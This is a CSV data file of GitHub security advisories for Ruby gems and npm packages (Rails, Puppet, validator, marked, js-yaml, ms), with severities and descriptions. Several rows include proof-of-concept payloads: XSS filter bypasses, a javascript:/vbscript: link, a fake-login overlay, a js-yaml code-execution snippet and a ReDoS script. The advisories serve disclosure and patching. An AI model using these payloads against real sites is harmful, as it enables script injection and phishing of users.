vulnerability_id,tool_id,tool_name,ghsa_id,cve_id,url,severity,published_at,summary,description,ecosystem
1615,18828,activerecord,GHSA-3crr-9vmg-864v,CVE-2013-1854,https://github.com/advisories/GHSA-3crr-9vmg-864v,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activerecord,"The Active Record component in Ruby on Rails 2.3.x before 2.3.18, 3.1.x before 3.1.12, and 3.2.x before 3.2.13 processes certain queries by converting hash keys to symbols, which allows remote attackers to cause a denial of service via crafted input to a where method.",rubygems
1616,18865,actionpack,GHSA-q759-hwvc-m3jg,CVE-2013-1855,https://github.com/advisories/GHSA-q759-hwvc-m3jg,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,"The sanitize_css method in lib/action_controller/vendor/html-scanner/html/sanitizer.rb in the Action Pack component in Ruby on Rails before 2.3.18, 3.0.x and 3.1.x before 3.1.12, and 3.2.x before 3.2.13 does not properly handle \n (newline) characters, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via crafted Cascading Style Sheets (CSS) token sequences.",rubygems
1617,18817,activesupport,GHSA-9c2j-593q-3g82,CVE-2013-1856,https://github.com/advisories/GHSA-9c2j-593q-3g82,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects activesupport,"The ActiveSupport::XmlMini_JDOM backend in lib/active_support/xml_mini/jdom.rb in the Active Support component in Ruby on Rails 3.0.x and 3.1.x before 3.1.12 and 3.2.x before 3.2.13, when JRuby is used, does not properly restrict the capabilities of the XML parser, which allows remote attackers to read arbitrary files or cause a denial of service (resource consumption) via vectors involving (1) an external DTD or (2) an external entity declaration in conjunction with an entity reference.",rubygems
1618,18865,actionpack,GHSA-j838-vfpq-fmf2,CVE-2013-1857,https://github.com/advisories/GHSA-j838-vfpq-fmf2,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,"The sanitize helper in lib/action_controller/vendor/html-scanner/html/sanitizer.rb in the Action Pack component in Ruby on Rails before 2.3.18, 3.0.x and 3.1.x before 3.1.12, and 3.2.x before 3.2.13 does not properly handle encoded : (colon) characters in URLs, which makes it easier for remote attackers to conduct cross-site scripting (XSS) attacks via a crafted scheme name, as demonstrated by including a &#x3a; sequence.",rubygems
1619,27168,passenger,GHSA-9qj7-jvg4-qr2x,CVE-2013-2119,https://github.com/advisories/GHSA-9qj7-jvg4-qr2x,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects passenger,"Phusion Passenger gem before 3.0.21 and 4.0.x before 4.0.5 for Ruby allows local users to cause a denial of service (prevent application start) or gain privileges by pre-creating a temporary ""config"" file in a directory with a predictable name in /tmp/ before it is used by the gem.",rubygems
1620,18955,mini_magick,GHSA-w754-gq8r-pf5f,CVE-2013-2616,https://github.com/advisories/GHSA-w754-gq8r-pf5f,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects mini_magick,lib/mini_magick.rb in the MiniMagick Gem 1.3.1 for Ruby allows remote attackers to execute arbitrary commands via shell metacharacters in a URL.,rubygems
1621,19282,puppet,GHSA-f7p5-w2cr-7cp7,CVE-2013-3567,https://github.com/advisories/GHSA-f7p5-w2cr-7cp7,high,2017-10-24 18:33:37 UTC,High severity vulnerability that affects puppet,"Puppet 2.7.x before 2.7.22 and 3.2.x before 3.2.2, and Puppet Enterprise before 2.8.2, deserializes untrusted YAML, which allows remote attackers to instantiate arbitrary Ruby classes and execute arbitrary code via a crafted REST API call.",rubygems
1622,27168,passenger,GHSA-w6rc-q387-vpgq,CVE-2013-4136,https://github.com/advisories/GHSA-w6rc-q387-vpgq,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects passenger,ext/common/ServerInstanceDir.h in Phusion Passenger gem before 4.0.6 for Ruby allows local users to gain privileges or possibly change the ownership of arbitrary directories via a symlink attack on a directory with a predictable name in /tmp/.,rubygems
1623,19030,actionmailer,GHSA-rg5m-3fqp-6px8,CVE-2013-4389,https://github.com/advisories/GHSA-rg5m-3fqp-6px8,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionmailer,Multiple format string vulnerabilities in log_subscriber.rb files in the log subscriber component in Action Mailer in Ruby on Rails 3.x before 3.2.15 allow remote attackers to cause a denial of service via a crafted e-mail address that is improperly handled during construction of a log message.,rubygems
1624,27811,wicked,GHSA-rprj-g6xc-p5gq,CVE-2013-4413,https://github.com/advisories/GHSA-rprj-g6xc-p5gq,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects wicked,Directory traversal vulnerability in controller/concerns/render_redirect.rb in the Wicked gem before 1.0.1 for Ruby allows remote attackers to read arbitrary files via a %2E%2E%2F (encoded dot dot slash) in the step.,rubygems
1625,19305,cocaine,GHSA-c43v-hrmg-56r4,CVE-2013-4457,https://github.com/advisories/GHSA-c43v-hrmg-56r4,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects cocaine,"The Cocaine gem 0.4.0 through 0.5.2 for Ruby allows context-dependent attackers to execute arbitrary commands via a crafted has object, related to recursive variable interpolation.",rubygems
1626,18865,actionpack,GHSA-699m-mcjm-9cw8,CVE-2013-4491,https://github.com/advisories/GHSA-699m-mcjm-9cw8,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,Cross-site scripting (XSS) vulnerability in actionpack/lib/action_view/helpers/translation_helper.rb in the internationalization component in Ruby on Rails 3.x before 3.2.16 and 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via a crafted string that triggers generation of a fallback string by the i18n gem.,rubygems
1627,18859,i18n,GHSA-r5hc-9xx5-97rw,CVE-2013-4492,https://github.com/advisories/GHSA-r5hc-9xx5-97rw,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects i18n,Cross-site scripting (XSS) vulnerability in exceptions.rb in the i18n gem before 0.6.6 for Ruby allows remote attackers to inject arbitrary web script or HTML via a crafted I18n::MissingTranslationData.new call.,rubygems
1628,19539,omniauth-facebook,GHSA-cf36-985g-v73c,CVE-2013-4562,https://github.com/advisories/GHSA-cf36-985g-v73c,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects omniauth-facebook,"The omniauth-facebook gem 1.4.1 before 1.5.0 does not properly store the session parameter, which allows remote attackers to conduct cross-site request forgery (CSRF) attacks via the state parameter.",rubygems
1629,15997,js-yaml,GHSA-xxvw-45rp-3mj2,CVE-2013-4660,https://github.com/advisories/GHSA-xxvw-45rp-3mj2,critical,2017-10-24 18:33:37 UTC,Deserialization Code Execution in js-yaml,"Versions 2.0.4 and earlier of `js-yaml` are affected by a code execution vulnerability in the YAML deserializer.

## Proof of Concept
```
const yaml = require('js-yaml');

const x = `test: !!js/function >
function f() { 
console.log(1); 
}();`

yaml.load(x);
```


## Recommendation

Update js-yaml to version 2.0.5 or later, and ensure that all instances where the `.load()` method is called are updated to use `.safeLoad()` instead.",npm
1630,19282,puppet,GHSA-cj43-9h3w-v976,CVE-2013-4761,https://github.com/advisories/GHSA-cj43-9h3w-v976,moderate,2017-10-24 18:33:37 UTC,Puppet allows remote attackers to execute arbitrary Ruby programs from the master via the resource_type service,"Unspecified vulnerability in Puppet 2.7.x before 2.7.23 and 3.2.x before 3.2.4, and Puppet Enterprise 2.8.x before 2.8.3 and 3.0.x before 3.0.1, allows remote attackers to execute arbitrary Ruby programs from the master via the resource_type service.  NOTE: this vulnerability can only be exploited utilizing unspecified ""local file system access"" to the Puppet Master.",rubygems
1631,19312,dragonfly,GHSA-qrgf-jqqm-x7xv,CVE-2013-5671,https://github.com/advisories/GHSA-qrgf-jqqm-x7xv,high,2017-10-24 18:33:37 UTC,Code injection in dragonfly gem,lib/dragonfly/imagemagickutils.rb in the fog-dragonfly gem 0.8.2 for Ruby allows remote attackers to execute arbitrary commands via unspecified vectors.,rubygems
1632,18865,actionpack,GHSA-mpxf-gcw2-pw5q,CVE-2013-6414,https://github.com/advisories/GHSA-mpxf-gcw2-pw5q,moderate,2017-10-24 18:33:37 UTC,Moderate severity vulnerability that affects actionpack,actionpack/lib/action_view/lookup_context.rb in Action View in Ruby on Rails 3.x before 3.2.16 and 4.x before 4.0.2 allows remote attackers to cause a denial of service (memory consumption) via a header containing an invalid MIME type that leads to excessive caching.,rubygems
1633,18865,actionpack,GHSA-6h5q-96hp-9jgm,CVE-2013-6415,https://github.com/advisories/GHSA-6h5q-96hp-9jgm,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,Cross-site scripting (XSS) vulnerability in the number_to_currency helper in actionpack/lib/action_view/helpers/number_helper.rb in Ruby on Rails before 3.2.16 and 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via the unit parameter.,rubygems
1634,18865,actionpack,GHSA-w37c-q653-qg95,CVE-2013-6416,https://github.com/advisories/GHSA-w37c-q653-qg95,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,Cross-site scripting (XSS) vulnerability in the simple_format helper in actionpack/lib/action_view/helpers/text_helper.rb in Ruby on Rails 4.x before 4.0.2 allows remote attackers to inject arbitrary web script or HTML via a crafted HTML attribute.,rubygems
1635,18865,actionpack,GHSA-wpw7-wxjm-cw8r,CVE-2013-6417,https://github.com/advisories/GHSA-wpw7-wxjm-cw8r,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"actionpack/lib/action_dispatch/http/request.rb in Ruby on Rails before 3.2.16 and 4.x before 4.0.2 does not properly consider differences in parameter handling between the Active Record component and the JSON implementation, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks or trigger missing WHERE clauses via a crafted request that leverages (1) third-party Rack middleware or (2) custom Rack middleware.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2013-0155.",rubygems
1636,26811,sprout,GHSA-229r-pqp6-8w6g,CVE-2013-6421,https://github.com/advisories/GHSA-229r-pqp6-8w6g,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects sprout,The unpack_zip function in archive_unpacker.rb in the sprout gem 0.7.246 for Ruby allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a (1) filename or (2) path.,rubygems
1637,18959,will_paginate,GHSA-8r6h-7x9g-xmw9,CVE-2013-6459,https://github.com/advisories/GHSA-8r6h-7x9g-xmw9,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects will_paginate,Cross-site scripting (XSS) vulnerability in the will_paginate gem before 3.0.5 for Ruby allows remote attackers to inject arbitrary web script or HTML via vectors involving generated pagination links.,rubygems
1638,16255,validator,GHSA-qpjp-7rp2-9c3f,CVE-2013-7451,https://github.com/advisories/GHSA-qpjp-7rp2-9c3f,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,The validator module before 1.1.0 for Node.js allows remote attackers to bypass the XSS filter via a nested tag.,npm
1639,16255,validator,GHSA-rh6c-q938-3r9q,CVE-2013-7452,https://github.com/advisories/GHSA-rh6c-q938-3r9q,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via a crafted javascript URI.,npm
1640,16255,validator,GHSA-552w-rqg8-gxxm,CVE-2013-7453,https://github.com/advisories/GHSA-552w-rqg8-gxxm,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,The validator module before 1.1.0 for Node.js allows remote attackers to bypass the cross-site scripting (XSS) filter via vectors related to UI redressing.,npm
1641,16255,validator,GHSA-q4qq-fm7q-cwp5,CVE-2013-7454,https://github.com/advisories/GHSA-q4qq-fm7q-cwp5,moderate,2017-10-24 18:33:36 UTC,Multiple XSS Filter Bypasses in validator,"Versions of `validator` prior to 1.1.0 are affected by several cross-site scripting vulnerabilities due to bypasses discovered in the blacklist-based filter.


## Proof of Concept
Various inputs that could bypass the filter were discovered:

Improper parsing of nested tags:

```
<s <onmouseover=""alert(1)""> <;s onmouseover=""alert(1)"">This is a test</s>
```

Incomplete filtering of javascript: URIs:

```
<a href=""javascriptJ a V a S c R iPt::alert(1)"" ""<s>"">test</a>
```

UI Redressing:

```
<div style=""z-index: 9999999; background-color: green; width: 100%; height: 100%"">
<h1>You have won</h1>Please click the link and enter your login details:
<a href=""http://example.com/"">http://good.com</a>
</div>
```

Bypass via Nested Forbidden Strings:

```
<scrRedirecRedirect 302t 302ipt type=""text/javascript"">prompt(1);</scrRedirecRedirect 302t 302ipt>
```

Additional bypasses were discovered by Krzysztof Kotowicz in 2012 when auditing CodeIgniter's XSS filtering function, which this code was based off of.


## Recommendation

If you are a developer currently using the xss filter function from the validator package, you should consider replacing it with the escape filter function from the same package. This function replaces all instances of angle brackets (<, >), ampersands, and quotation marks, so no HTML tags will be processed.",npm
1642,27059,rbovirt,GHSA-ww79-8xwv-932x,CVE-2014-0036,https://github.com/advisories/GHSA-ww79-8xwv-932x,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rbovirt,"The rbovirt gem before 0.0.24 for Ruby uses the rest-client gem with SSL verification disabled, which allows remote attackers to conduct man-in-the-middle attacks via unspecified vectors.",rubygems
1643,18816,rails,GHSA-m46p-ggm5-5j83,CVE-2014-0081,https://github.com/advisories/GHSA-m46p-ggm5-5j83,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails,"Multiple cross-site scripting (XSS) vulnerabilities in actionview/lib/action_view/helpers/number_helper.rb in Ruby on Rails before 3.2.17, 4.0.x before 4.0.3, and 4.1.x before 4.1.0.beta2 allow remote attackers to inject arbitrary web script or HTML via the (1) format, (2) negative_format, or (3) units parameter to the (a) number_to_currency, (b) number_to_percentage, or (c) number_to_human helper.",rubygems
1644,18865,actionpack,GHSA-7cgp-c3g7-qvrw,CVE-2014-0082,https://github.com/advisories/GHSA-7cgp-c3g7-qvrw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"actionpack/lib/action_view/template/text.rb in Action View in Ruby on Rails 3.x before 3.2.17 converts MIME type strings to symbols during use of the :text option to the render method, which allows remote attackers to cause a denial of service (memory consumption) by including these strings in headers.",rubygems
1645,18865,actionpack,GHSA-6x85-j5j2-27jx,CVE-2014-0130,https://github.com/advisories/GHSA-6x85-j5j2-27jx,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"Directory traversal vulnerability in actionpack/lib/abstract_controller/base.rb in the implicit-render implementation in Ruby on Rails before 3.2.18, 4.0.x before 4.0.5, and 4.1.x before 4.1.1, when certain route globbing configurations are enabled, allows remote attackers to read arbitrary files via a crafted request.",rubygems
1646,27437,rack-ssl,GHSA-v3rr-cph9-2g2q,CVE-2014-2538,https://github.com/advisories/GHSA-v3rr-cph9-2g2q,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rack-ssl,"Cross-site scripting (XSS) vulnerability in lib/rack/ssl.rb in the rack-ssl gem before 1.4.0 for Ruby allows remote attackers to inject arbitrary web script or HTML via a URI, which might not be properly handled by third-party adapters such as JRuby-Rack.",rubygems
1647,19301,facter,GHSA-92v7-pq4h-58j5,CVE-2014-3248,https://github.com/advisories/GHSA-92v7-pq4h-58j5,moderate,2017-10-24 18:33:36 UTC,"Moderate severity vulnerability that affects facter, hiera, mcollective-client, and puppet","Untrusted search path vulnerability in Puppet Enterprise 2.8 before 2.8.7, Puppet before 2.7.26 and 3.x before 3.6.2, Facter 1.6.x and 2.x before 2.0.2, Hiera before 1.3.4, and Mcollective before 2.5.2, when running with Ruby 1.9.1 or earlier, allows local users to gain privileges via a Trojan horse file in the current working directory, as demonstrated using (1) rubygems/defaults/operating_system.rb, (2) Win32API.rb, (3) Win32API.so, (4) safe_yaml.rb, (5) safe_yaml/deep.rb, or (6) safe_yaml/deep.so; or (7) operatingsystem.rb, (8) operatingsystem.so, (9) osfamily.rb, or (10) osfamily.so in puppet/confine.",rubygems
1648,18828,activerecord,GHSA-mhwp-qhpc-h3jm,CVE-2014-3482,https://github.com/advisories/GHSA-mhwp-qhpc-h3jm,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects activerecord,SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql_adapter.rb in the PostgreSQL adapter for Active Record in Ruby on Rails 2.x and 3.x before 3.2.19 allows remote attackers to execute arbitrary SQL commands by leveraging improper bitstring quoting.,rubygems
1649,18828,activerecord,GHSA-r8fh-hq2p-7qhq,CVE-2014-3483,https://github.com/advisories/GHSA-r8fh-hq2p-7qhq,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects activerecord,SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql/quoting.rb in the PostgreSQL adapter for Active Record in Ruby on Rails 4.x before 4.0.7 and 4.1.x before 4.1.3 allows remote attackers to execute arbitrary SQL commands by leveraging improper range quoting.,rubygems
1650,18828,activerecord,GHSA-9rf5-jm6f-2fmm,CVE-2014-3514,https://github.com/advisories/GHSA-9rf5-jm6f-2fmm,high,2017-10-24 18:33:36 UTC,High severity vulnerability that affects activerecord,activerecord/lib/active_record/relation/query_methods.rb in Active Record in Ruby on Rails 4.0.x before 4.0.9 and 4.1.x before 4.1.5 allows remote attackers to bypass the strong parameters protection mechanism via crafted input to an application that makes create_with calls.,rubygems
1651,16345,hapi,GHSA-cqr7-78pj-3g7j,CVE-2014-3742,https://github.com/advisories/GHSA-cqr7-78pj-3g7j,high,2017-10-24 18:33:36 UTC,File Descriptor Leak Can Cause DoS Vulnerability in hapi,"Versions 2.0.x and 2.1.x of hapi are vulnerable to a denial of service attack via a file descriptor leak. 

When triggered repeatedly, this leak will cause the server to run out of file descriptors and the node process to die. The effort required to take down a server depends on the process file descriptor limit. No other side effects or exploits have been identified.



## Recommendation

- Please upgrade to version 2.2.x or above as soon as possible.",npm
1652,17093,send,GHSA-xwg4-93c6-3h42,CVE-2014-6394,https://github.com/advisories/GHSA-xwg4-93c6-3h42,low,2017-10-24 18:33:36 UTC,Directory Traversal in send,"Versions 0.8.3 and earlier of `send` are affected by a directory traversal vulnerability. When relying on the root option to restrict file access it may be possible for an application consumer to escape out of the restricted directory and access files in a similarly named directory. 

For example, `static(_dirname + '/public')` would allow access to `_dirname + '/public-restricted'`.


## Recommendation

Update to version 0.8.4 or later.",npm
1653,16125,qs,GHSA-jjv7-qpx3-h62q,CVE-2014-7191,https://github.com/advisories/GHSA-jjv7-qpx3-h62q,high,2017-10-24 18:33:36 UTC,Denial-of-Service Memory Exhaustion in qs,"Versions prior to 1.0 of `qs` are affected by a denial of service condition. This condition is triggered by parsing a crafted string that deserializes into very large sparse arrays, resulting in the process running out of memory and eventually crashing.


## Recommendation

Update to version 1.0.0 or later.",npm
1654,18865,actionpack,GHSA-29gr-w57f-rpfw,CVE-2014-7818,https://github.com/advisories/GHSA-29gr-w57f-rpfw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects actionpack,"Directory traversal vulnerability in actionpack/lib/action_dispatch/middleware/static.rb in Action Pack in Ruby on Rails 3.x before 3.2.20, 4.0.x before 4.0.11, 4.1.x before 4.1.7, and 4.2.x before 4.2.0.beta3, when serve_static_assets is enabled, allows remote attackers to determine the existence of files outside the application root via a /..%2F sequence.",rubygems
1655,18932,sprockets,GHSA-33pp-3763-mrfp,CVE-2014-7819,https://github.com/advisories/GHSA-33pp-3763-mrfp,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects sprockets,"Multiple directory traversal vulnerabilities in server.rb in Sprockets before 2.0.5, 2.1.x before 2.1.4, 2.2.x before 2.2.3, 2.3.x before 2.3.3, 2.4.x before 2.4.6, 2.5.x before 2.5.1, 2.6.x and 2.7.x before 2.7.1, 2.8.x before 2.8.3, 2.9.x before 2.9.4, 2.10.x before 2.10.2, 2.11.x before 2.11.3, 2.12.x before 2.12.3, and 3.x before 3.0.0.beta.3, as distributed with Ruby on Rails 3.x and 4.x, allow remote attackers to determine the existence of files outside the application root via a ../ (dot dot slash) sequence with (1) double slashes or (2) URL encoding.",rubygems
1656,19498,sentry-raven,GHSA-c9c5-9fpr-m882,CVE-2014-9490,https://github.com/advisories/GHSA-c9c5-9fpr-m882,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects sentry-raven,The numtok function in lib/raven/okjson.rb in the raven-ruby gem before 0.12.2 for Ruby allows remote attackers to cause a denial of service via a large exponent value in a scientific number.,rubygems
1657,16255,validator,GHSA-9959-c6q6-6qp3,,https://github.com/advisories/GHSA-9959-c6q6-6qp3,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects validator,**Withdrawn:** Duplicate of GHSA-79mx-88w7-8f7q,npm
1658,16065,marked,GHSA-cfjh-p3g4-3q2f,CVE-2015-1370,https://github.com/advisories/GHSA-cfjh-p3g4-3q2f,moderate,2017-10-24 18:33:36 UTC,VBScript Content Injection in marked,"Versions 0.3.2 and earlier of `marked` are affected by a cross-site scripting vulnerability even when `sanitize:true` is set. 

## Proof of Concept ( IE10 Compatibility Mode Only )

`[xss link](vbscript:alert(1&#41;)`

will get a link

`<a href=""vbscript:alert(1)"">xss link</a>`


## Recommendation

Update to version 0.3.3 or later.",npm
1659,18864,jquery-rails,GHSA-4whc-pp4x-9pf3,CVE-2015-1840,https://github.com/advisories/GHSA-4whc-pp4x-9pf3,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects jquery-rails and jquery-ujs,"jquery_ujs.js in jquery-rails before 3.1.3 and 4.x before 4.0.4 and rails.js in jquery-ujs before 1.0.4, as used with Ruby on Rails 3.x and 4.x, allow remote attackers to bypass the Same Origin Policy, and trigger transmission of a CSRF token to a different-domain web server, via a leading space character in a URL within an attribute value.",rubygems
1660,18985,paperclip,GHSA-6jvm-3j5h-79f6,CVE-2015-2963,https://github.com/advisories/GHSA-6jvm-3j5h-79f6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects paperclip,"The thoughtbot paperclip gem before 4.2.2 for Ruby does not consider the content-type value during media-type validation, which allows remote attackers to upload HTML documents and conduct cross-site scripting (XSS) attacks via a spoofed value, as demonstrated by image/jpeg.",rubygems
1661,27066,web-console,GHSA-67j6-xv27-w6ww,CVE-2015-3224,https://github.com/advisories/GHSA-67j6-xv27-w6ww,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects web-console,"request.rb in Web Console before 2.1.3, as used with Ruby on Rails 3.x and 4.x, does not properly restrict the use of X-Forwarded-For headers in determining a client's IP address, which allows remote attackers to bypass the whitelisted_ips protection mechanism via a crafted request.",rubygems
1662,18839,rack,GHSA-rgr4-9jh5-j4j6,CVE-2015-3225,https://github.com/advisories/GHSA-rgr4-9jh5-j4j6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rack,"lib/rack/utils.rb in Rack before 1.5.4 and 1.6.x before 1.6.2, as used with Ruby on Rails 3.x and 4.x and other products, allows remote attackers to cause a denial of service (SystemStackError) via a request with a large parameter depth.",rubygems
1663,18817,activesupport,GHSA-j96r-xvjq-r9pg,CVE-2015-3227,https://github.com/advisories/GHSA-j96r-xvjq-r9pg,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects activesupport,"The (1) jdom.rb and (2) rexml.rb components in Active Support in Ruby on Rails before 4.1.11 and 4.2.x before 4.2.2, when JDOM or REXML is enabled, allow remote attackers to cause a denial of service (SystemStackError) via a large XML document depth.",rubygems
1664,18836,rest-client,GHSA-mx9f-w8qq-q5jf,CVE-2015-3448,https://github.com/advisories/GHSA-mx9f-w8qq-q5jf,low,2017-10-24 18:33:36 UTC,Low severity vulnerability that affects rest-client,"REST client for Ruby (aka rest-client) before 1.7.3 logs usernames and passwords, which allows local users to obtain sensitive information by reading the log.",rubygems
1665,27604,rails-html-sanitizer,GHSA-59c7-4xj2-hgvw,CVE-2015-7578,https://github.com/advisories/GHSA-59c7-4xj2-hgvw,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via crafted tag attributes.,rubygems
1666,27604,rails-html-sanitizer,GHSA-r9c2-cr39-c8g6,CVE-2015-7579,https://github.com/advisories/GHSA-r9c2-cr39-c8g6,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,Cross-site scripting (XSS) vulnerability in the rails-html-sanitizer gem 1.0.2 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via an HTML entity that is mishandled by the Rails::Html::FullSanitizer class.,rubygems
1667,27604,rails-html-sanitizer,GHSA-ghqm-pgxj-37gq,CVE-2015-7580,https://github.com/advisories/GHSA-ghqm-pgxj-37gq,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects rails-html-sanitizer,Cross-site scripting (XSS) vulnerability in lib/rails/html/scrubbers.rb in the rails-html-sanitizer gem before 1.0.3 for Ruby on Rails 4.2.x and 5.x allows remote attackers to inject arbitrary web script or HTML via a crafted CDATA node.,rubygems
1668,16565,ms,GHSA-3fx5-fwvr-xrjg,CVE-2015-8315,https://github.com/advisories/GHSA-3fx5-fwvr-xrjg,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in ms,"Versions of `ms` prior to 0.7.1 are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.

## Proof of Concept
```javascript
var ms = require('ms');
var genstr = function (len, chr) {
   var result = """";
   for (i=0; i<=len; i++) {
       result = result + chr;
   }

   return result;
}

ms(genstr(process.argv[2], ""5"") + "" minutea"");

```

### Results
Showing increase in execution time based on the input string.
```
$ time node ms.js 10000

real	0m0.758s
user	0m0.724s
sys	0m0.031s

$ time node ms.js 20000

real	0m2.580s
user	0m2.494s
sys	0m0.047s

$ time node ms.js 30000

real	0m5.747s
user	0m5.483s
sys	0m0.080s

$ time node ms.js 80000

real	0m41.022s
user	0m38.894s
sys	0m0.529s
```
",npm
1669,16065,marked,GHSA-hjcp-j389-59ff,CVE-2015-8854,https://github.com/advisories/GHSA-hjcp-j389-59ff,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in marked,"Versions 0.3.3 and earlier of `marked` are affected by a regular expression denial of service ( ReDoS ) vulnerability when passed inputs that reach the `em` inline rule.



## Recommendation

Update to version 0.3.4 or later.",npm
1670,18809,semver,GHSA-x6fg-f45m-jf5q,CVE-2015-8855,https://github.com/advisories/GHSA-x6fg-f45m-jf5q,high,2017-10-24 18:33:36 UTC,Regular Expression Denial of Service in semver,"Versions 4.3.1 and earlier of `semver` are affected by a regular expression denial of service vulnerability when extremely long version strings are parsed.



## Recommendation

Update to version 4.3.2 or later",npm
1671,17299,serve-index,GHSA-v633-x5vv-hqwc,CVE-2015-8856,https://github.com/advisories/GHSA-v633-x5vv-hqwc,moderate,2017-10-24 18:33:36 UTC,Cross-Site Scripting in serve-index,"Versions 1.6.2 and earlier of `serve-index` are affected by a cross-site scripting vulnerability. Because file and directory names are not escaped in the module's HTML output, a remote attacker that can influence file or directory names can launch a persistent cross-site scripting attack on the application.


## Recommendation

Update to version 1.6.3 or later.",npm
1672,15900,uglify-js,GHSA-34r7-q49f-h37c,CVE-2015-8857,https://github.com/advisories/GHSA-34r7-q49f-h37c,critical,2017-10-24 18:33:36 UTC,Incorrect Handling of Non-Boolean Comparisons During Minification in uglify-js,"Versions of `uglify-js` prior to 2.4.24 are affected by a vulnerability which may cause crafted JavaScript to have altered functionality after minification.

## Recommendation

Upgrade UglifyJS to version >= 2.4.24.",npm
